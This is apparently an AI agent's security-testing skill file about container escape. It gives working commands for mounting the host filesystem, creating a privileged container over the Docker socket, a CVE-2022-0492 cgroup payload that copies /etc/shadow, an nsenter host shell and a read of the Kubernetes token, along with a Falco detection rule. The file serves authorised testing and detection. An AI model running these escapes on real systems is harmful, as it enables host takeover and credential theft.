---
name: container-escape-detection
description: Detect and test container escape vectors — privileged containers, Docker socket exposure, cgroup abuse, kernel exploits
origin: AI Threat Hunting
---

# Container Escape Detection

## When to Activate

- Testing containerized applications (Docker, Kubernetes pods)
- Assessing container runtime security controls
- Investigating suspected container breakout
- Validating Falco/seccomp/AppArmor enforcement

## Tools

- Docker CLI / kubectl
- Falco (runtime detection)
- amicontained (capability checker)
- deepce (container escape enumeration)
- CDK (Container penetration toolkit)

## Methodology

### 1. Container Enumeration
- [ ] Check if running in container: `/.dockerenv` exists, `cat /proc/1/cgroup | grep docker`
- [ ] Enumerate capabilities: `capsh --print` or `amicontained`
- [ ] Check seccomp profile: `grep Seccomp /proc/self/status`
- [ ] List mounted volumes: `mount | grep -v proc`
- [ ] Check for Docker socket: `ls -la /var/run/docker.sock`

### 2. Privileged Container Escape
- [ ] If `--privileged` flag or all capabilities: immediate escape path
- [ ] Mount host filesystem:
```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Now access entire host filesystem at /mnt/host
chroot /mnt/host
```
- [ ] Load kernel module for persistent access

### 3. Docker Socket Escape
- [ ] If `/var/run/docker.sock` is mounted:
```bash
# List host containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
# Create privileged container with host mount
curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" \
  http://localhost/containers/create -d '{"Image":"alpine","HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
```

### 4. Cgroup Escape (CVE-2022-0492)
- [ ] Requires CAP_SYS_ADMIN or unconfined AppArmor
```bash
# Mount cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# Set release_agent to payload
echo 1 > /tmp/cgrp/x/notify_on_release
echo "#!/bin/sh" > /cmd
echo "cat /etc/shadow > /tmp/cgrp/x/output" >> /cmd
chmod a+x /cmd
host_path=$(sed -n 's/.*perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
# Trigger
echo $$ > /tmp/cgrp/x/cgroup.procs
```

### 5. Sensitive Mount Exploitation
- [ ] `/proc/sysrq-trigger` — can trigger host reboot/crash
- [ ] `/proc/sys/kernel/core_pattern` — write path for crash dumps, can achieve code execution
- [ ] `/sys/kernel/uevent_helper` — trigger helper execution on device events
- [ ] Host PID namespace: `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash`

### 6. Capability-Based Escape

| Capability | Escape Vector |
|-----------|--------------|
| CAP_SYS_ADMIN | Mount host filesystem, cgroup escape, BPF manipulation |
| CAP_SYS_PTRACE | Process injection into host-namespace processes |
| CAP_NET_ADMIN | Network namespace manipulation, ARP spoofing |
| CAP_DAC_READ_SEARCH | Read any file via open_by_handle_at (Shocker exploit) |
| CAP_SYS_MODULE | Load kernel module for persistent host access |

### 7. Escape Binaries (Detection)
Alert on these binaries executing inside containers:
`nsenter`, `unshare`, `mount`, `chroot`, `modprobe`, `insmod`

Falco rule example:
```yaml
- rule: Container Escape via nsenter
  desc: nsenter executed inside container — potential breakout
  condition: container.id != host and proc.name = nsenter
  output: "Container escape attempt (user=%user.name container=%container.name proc=%proc.cmdline)"
  priority: CRITICAL
```

### 8. Kubernetes-Specific
- [ ] Service account token: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
- [ ] Can this token create privileged pods? `kubectl auth can-i create pods --as=system:serviceaccount:default:default`
- [ ] Escape via hostPID/hostNetwork/hostIPC pod spec if RBAC allows pod creation

## What to Record

- Container runtime and version (Docker, containerd, CRI-O)
- Capabilities granted vs default set
- Seccomp/AppArmor profile status (enforcing, complaining, unconfined)
- Mounted volumes and sensitive paths exposed
- Docker socket presence and permissions
- Escape vector used and host-level access achieved
- Falco/runtime detection coverage gaps
- Kubernetes RBAC permissions for the service account

## Kill Signals — Stop Testing When
- Container is privileged (all capabilities) → CRITICAL, record immediately — escape is trivial, no need to test other vectors
- Docker socket (/var/run/docker.sock) accessible → CRITICAL, record immediately — full host compromise possible
- No dangerous capabilities, no socket, seccomp enforced, AppArmor active → container hardened, move on
- Kubernetes service account token has no create-pod or exec permissions → K8s escape not feasible from this pod

## Extended Resources

None -- this skill works from container internals, capability enumeration, and runtime detection logs.
